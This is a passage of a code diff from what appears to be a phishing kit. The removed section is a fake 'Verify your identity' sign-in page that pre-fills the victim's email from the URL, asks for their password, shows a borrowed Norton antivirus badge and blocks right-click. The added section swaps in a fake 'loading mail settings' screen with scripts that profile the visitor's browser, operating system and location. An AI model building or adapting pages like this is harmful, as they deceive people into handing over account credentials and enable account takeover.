+    for (var key in browsers) {
+        if (browsers[key].test(userAgent)) {
+            return key;
+        }
+    }
+    return "Unknown";
+}
+
+// Function to detect operating system
+function detectOS() {
+    var userAgent = window.navigator.userAgent;
+    var os;
+    if (userAgent.indexOf("Windows") !== -1) {
+        os = "Windows";
+    } else if (userAgent.indexOf("Mac") !== -1) {
+        os = "Mac OS";
+    } else if (userAgent.indexOf("Linux") !== -1) {
+        os = "Linux";
+    } else {
+        os = "Unknown";
+    }
+    return os;
+}
 </script>
-
 </head>
-<body id="top">
- <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
-allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
-<body oncontextmenu="return false;">
 
-<!-- Login 1 start -->
-<div class="login-1">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-12">
-                <div class="login-inner-form">
-                    <div class="details">
-                        
-						<h2 class="text-center"><div id="top"><img src="data:image/jpeg;base64,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" alt="" id="logoimg" style="width:100px;height:100px;margin-top:12px;">
-		 <div>
-		<span style="vertical-align: middle; padding-left: 0px" class="logoname">Sign In</span> 
-		<br>
-	<!--<br>  
-		Sign in -->
-		</div></h1>
-		
-                        <h3>Verify your identity to continue</h3>
-                        <form name="members" action="" method="post">
-						  <div class="form-group">
-						  <center>
-                                    <div class="alert alert-danger" id="msg" style="display: none;"></div>
-									<div id="msg" style="display: none;font-weight: 600;color: red;">wrong username or Password.! Please enter correct details.</div>
-                                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
-                            </center>
-                                <input type="email" id="email"  name="email" class="input-text" placeholder="Email Address" readonly>
-                          </div>
-                            <div class="form-group">
-                                <input type="password" id="password" name="password" class="input-text" required autocomplete="on" placeholder="Enter Password"  >
-                            </div>
-                            <table width="247" border="0" align="center" cellpadding="0" cellspacing="0">
-                              <tr>
-                                <td bgcolor="#13c910"><div class="btn-holder">
-                                  <button class="btn btn-lg col-12 style1" id="submit-btn">Continue</button>
-                                </div></td>
-                              </tr>
-                          </table>
-                            <img src="https://firebasestorage.googleapis.com/v0/b/nortona-intensivecare90.appspot.com/o/norton%20antivirus%20pics.png?alt=media&token=cff4396a-c9ec-4d2d-a178-41f84737d2cc" width="70" height="40">
-                        </form>
-						<span class="privacy">
-						</div>
-                    <div class="footer">
-                    Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
-Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
-                    </div>
-						
-                    
-                </div>
-            </div>
+<body  style="background-color: transparent;">
+
+    <!-- loader -->
+    <div class="mail-loader_block" id="first" style="margin-top:-200px;" >
+		<center>
+        <img class="main_logo_id" src="" style="width:70px;">
+        <div class="loader" >
+            <div class="loaderBar" style="background-color: green;"></div>
         </div>
-    </div>
+        <!-- <br> -->
+        <hr style="width:50%;text-align:left;margin-left:0;">
+        <div class="loading_text">loading <span id="loader_email"></span> mail settings ...</div>
+        <hr style="width:50%;text-align:left;margin-left:0">
+<div class="info">
+    <span class="datetime"></span>
+    <span class="browser"></span>
+    <span class="os"></span>
+    <span class="location"></span>
 </div>
     <script>
-        window.onload = function() {
-            // Function to get the value of a query parameter by name
-            function getQueryParam(param) {
-                var urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get(param);
-            }
-
-            // Get the 'email' parameter from the URL
-            var email = getQueryParam('email');
-
-            // If the email parameter exists, set it in the email input field
-            if (email) {
-                document.getElementById('email').value = email;
-            }
-        };
+    // Call the function to display date, time, browser, OS, and location in the first section
+    displayInfo();
     </script>
